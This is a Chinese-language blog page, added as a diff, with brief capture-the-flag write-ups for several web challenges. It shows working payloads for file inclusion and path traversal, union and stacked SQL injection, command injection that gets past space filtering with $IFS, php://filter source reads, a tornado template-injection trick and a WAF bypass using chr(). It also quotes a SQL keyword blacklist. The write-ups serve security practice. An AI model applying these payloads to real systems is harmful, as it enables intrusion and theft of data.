@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>刷题1 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="[HCTF 2018]WarmUp 1 文件包含 这个按了下f12发现跳出了源码 $whitelist数组有两个值 一个source.php 一个hint.php 进入hint试一下 告诉我们flag在ffffllllaaaagggg中 但是一般来说没法直接访问 源码还有一部分 if (! empty($_REQUEST[‘file’])  &#x2F;&#x2F;$_REQUEST[‘file’]值非空">
+<meta property="og:type" content="article">
+<meta property="og:title" content="刷题1">
+<meta property="og:url" content="http://example.com/2021/05/03/page-43/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="[HCTF 2018]WarmUp 1 文件包含 这个按了下f12发现跳出了源码 $whitelist数组有两个值 一个source.php 一个hint.php 进入hint试一下 告诉我们flag在ffffllllaaaagggg中 但是一般来说没法直接访问 源码还有一部分 if (! empty($_REQUEST[‘file’])  &#x2F;&#x2F;$_REQUEST[‘file’]值非空">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-05-02T23:58:31.000Z">
+<meta property="article:modified_time" content="2021-05-03T00:00:16.686Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-page-43" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/05/03/page-43/" class="article-date">
+  <time class="dt-published" datetime="2021-05-02T23:58:31.000Z" itemprop="datePublished">2021-05-03</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      刷题1
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><strong>[HCTF 2018]WarmUp 1</strong> 文件包含 这个按了下f12发现跳出了源码 $whitelist数组有两个值 一个source.php 一个hint.php 进入hint试一下 告诉我们flag在ffffllllaaaagggg中 但是一般来说没法直接访问 源码还有一部分<br> if (! empty($_REQUEST[‘file’])  //$_REQUEST[‘file’]值非空<br>        &amp;&amp; is_string($_REQUEST[‘file’])  //$_REQUEST[‘file’]值为字符串<br>        &amp;&amp; emmm::checkFile($_REQUEST[‘file’])  //能够通过checkFile函数校验<br>    ) {<br>        include $_REQUEST[‘file’];  //包含$_REQUEST[‘file’]文件<br>        exit;<br>    } else {<br>        echo “<br>&lt;img src=&quot;<a target="_blank" rel="noopener" href="https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg/&quot;">https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot;</a> /&gt;”;<br>        //打印滑稽表情<br>    }   要传入file 首先不能为空 类型为字符串 能通过checkFile()函数<br> highlight_file(<strong>FILE</strong>); //打印代码<br>    class emmm  //定义emmm类<br>    {<br>        public static function checkFile(&amp;$page)//将传入的参数赋给$page<br>        {<br>            $whitelist = [“source”=&gt;”source.php”,”hint”=&gt;”hint.php”];//声明$whitelist（白名单）数组<br>            if (! isset($page) || !is_string($page)) {//若$page变量不存在或非字符串<br>                echo “you can’t see it”;//打印”you can’t see it”<br>                return false;//返回false<br>            }</p>
+<pre><code>        if (in_array($page, $whitelist)) &#123;//若$page变量存在于$whitelist数组中
+            return true;//返回true
+        &#125;
+
+        $_page = mb_substr(//该代码表示截取$page中&#39;?&#39;前部分，若无则截取整个$page
+            $page,
+            0,
+            mb_strpos($page . &#39;?&#39;, &#39;?&#39;)
+        );
+        if (in_array($_page, $whitelist)) &#123;
+            return true;
+        &#125;
+
+        $_page = urldecode($page);//url解码$page
+        $_page = mb_substr(
+            $_page,
+            0,
+            mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)
+        );
+        if (in_array($_page, $whitelist)) &#123;
+            return true;
+        &#125;
+        echo &quot;you can&#39;t see it&quot;;
+        return false;
+    &#125;
+&#125;  这边还有这段代码
+</code></pre>
+<p>第一个if语句对变量进行检验，要求$page为字符串，否则返回false<br>第二个if语句判断$page是否存在于$whitelist数组中，存在则返回true<br>第三个if语句判断截取后的$page是否存在于$whitelist数组中，截取$page中’?’前部分，存在则返回true<br>第四个if语句判断url解码并截取后的$page是否存在于$whitelist中，存在则返回true<br>若以上四个if语句均未返回值，则返回false<br> 用文件包含  。。。。/source.php?file=source.php?../ffffllllaaaagggg  无返回值那就再加../多加几个说不定就出来了 最后总共五个就有显示flag </p>
+<p><strong>[极客大挑战 2019]EasySQL 1</strong>  sql注入 用个union select 就出来了  随便输入一个用户名 aaa’ union select 1,2,3 # 密码aaa 这关就很水 直接就显示flag了╮(╯▽╰)╭<br><strong>[极客大挑战 2019]Havefun 1</strong>  sql注入  看源码<br>$cat=$_GET[‘cat’];<br>        echo $cat;<br>        if($cat==’dog’){<br>            echo ‘Syc{cat_cat_cat_cat}’;  就试一下在后面加个?cat=dog  ok flag显示了<br><strong>[SUCTF 2019]EasySQL 1</strong>  sql注入 堆叠注入 输入1;show databases;show tables; 显示了一些东西但是没法查columns里面的数据 据说这关泄露的源码 但是我没找出来 所以看了下别人找出来的<br> $BlackList = “prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|&quot;“;  很长的一串黑名单 但是没过滤* 直接select就完事了 输入*,1;<br>因为内置的sql语句sql=”select”.sql=”select”.post[‘query’].”||flag from Flag”;  就直接给了flag了<br><strong>[ACTF2020 新生赛]Include 1</strong>    这个页面右键看了下源码?file=flag 文件包含构造了一手pyload: ?file=php://filter/read=convert.base64-encode/resource=flag.php 出来一段base64 编码的东西解码一下就得到flag了<br> <strong>[极客大挑战 2019]Secret File 1</strong>          这个什么蒋璐源的秘密的 右键源码发现还有别的页面 点进去另一个页面 点了下secret 就没了what？∑( 口 || 老子看都没看就没了 用burp抓一下有secret的那个页面 然后转到repeater那边重发一波 又一波<br>发现了一个secr3t.php，访问 然后用上一关用过的神奇操作在后面加个<br>?file=php://filter/read=convert.base64-encode/resource=flag.php 得到一串 解码一波就能得到flag<br><strong>[极客大挑战 2019]LoveSQL 1</strong> sql注入 那一套组合拳 用union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database()# 这个顺序变一下 然后union select 1,2,group_concat(id,username,password) from (表名叫什么来着忘了） 反正就能得到flag了<br><strong>[GXYCTF2019]Ping Ping Ping 1</strong>  命令行注入 那么就用127.0.0.1 他的本机ip来搞他  127.0.0.1;ls 显示还有index.php flag.php<br>127.0.0.1;cat flag.php 显示fxck your space！ 过滤了空格 注：%20(space)、%09(tab)、$IFS$9、${IFS}$9、 {IFS}、IFS 都可以用来绕过过滤了空格的操作 可以试一下打开index.php的文件构造?ip=127.0.0.1;cat$IFS$1index.php 查看过滤名单<br>  构造/?ip=127.0.0.1;b=ag;a=fl;cat$IFS$1$a$b.php  即可获取flag 注：此处将变量ab的位置互换是为了绕过字符串匹配<br>          3.内联执行 （真正的大佬操作，给跪了）</p>
+<pre><code>      构造 /?ip=127.0.0.1;cat$IFS$9`ls`
+
+      注：内联，就是将反引号内命令的输出作为输入执行。
+
+      什么正则都是浮云，可能这就是大佬的世界吧。
+</code></pre>
+<p><strong>[ACTF2020 新生赛]Exec 1</strong> 一个命令行注入 需要cat指令用来打开东西  就ls列出他的文件来 用几个../ 就能找到有flag的地方</p>
+<p><strong>[护网杯 2018]easy_tornado1</strong>  这个用的是tornado的服务器框架 hints那边有个提示md5(cookie_secret+md5(filename))  file?filename=/hints.txt&amp;filehash=96981af0012f04a22b942f5bf957f7ef所以后面这串hash应该是这么来的<br>现在就是找出cookie_secret  tornado 框架的官网找一下cookie_secret在RequestHandler.application.settings里<br>用handler.settings访问RequestHandler.application.settings  然后payload   /error?msg= 得到cookie_secret 再flag那边得知fllllllllllllag 真flag在这 fllllllllllllag这个搞成MD5加密的然后和cookie_sceret组合一下MD5加密一波<br>file?filename=/fllllllllllllag.txt&amp;filehash=34e4c6c1748d183dd644a5f0e9290b37<br><strong>[RoarCTF 2019]Easy Calc 1</strong>     右键源码发现还有另一个php文件 叫calc.php      $_GET[‘num’] payload构造就是?num=1;var_dump(scandir(chr(47)))<br>var_dump()用来打印<br>scandir（）用来获取目录文件<br>chr（47）是 /的ASCII编码，因为 / 被过滤了，用这个什么都不显示。 var_dump(file_get_contents())  配合ASCII编码使用chr() 里头写入数字<br>再就是num前有个空格，用来绕过waf（web防火墙）（为什么是waf？）。<br>这是php的机制，在传进php代码的url时，一些字符会被忽略或变成_。<br>因为php一般是这样$_GET[‘num’]获取url传进来的参数,当有一些奇怪的字符和参数写在一些时，如%[num%id,它会变成$_GET[‘num_id’]。所以在num前加个空格可以绕过waf并且php会把它当成正常的num使用，此时并不是’ num’而是‘num’。<br>这个之前sqlilabs出现过就是那个号称拥有最强防火墙的<br>打开flagg这个 ? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))<br>chr(47)——/<br>chr(102)——f<br>chr(49)——1<br>chr(97)——a<br>chr(103)——g<br>它们之间用.连接，因为是php。  就可以获取flag </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/05/03/page-43/" data-id="ckroqtflr000ryww77uc2gkdv" data-title="刷题1" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2021/05/03/page-44/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          刷题2
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/05/03/page-42/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">之前的uploadlabs的被安全卫士杀掉了</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/07/21/page-79/">MRCTF2020Ezpop</a>
+          </li>
+        
+          <li>
+            <a href="/2021/07/21/page-78/">NPUCTF2020ReadlezPHP</a>
+          </li>
+        
+          <li>
+            <a href="/2021/07/21/page-77/">网鼎杯 2020 朱雀组Nmap</a>
+          </li>
+        
+          <li>
+            <a href="/2021/07/16/page-76/">羊城杯 2020image_rar</a>
+          </li>
+        
+          <li>
+            <a href="/2021/07/14/page-74/">强网杯2021 threebody</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2021 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
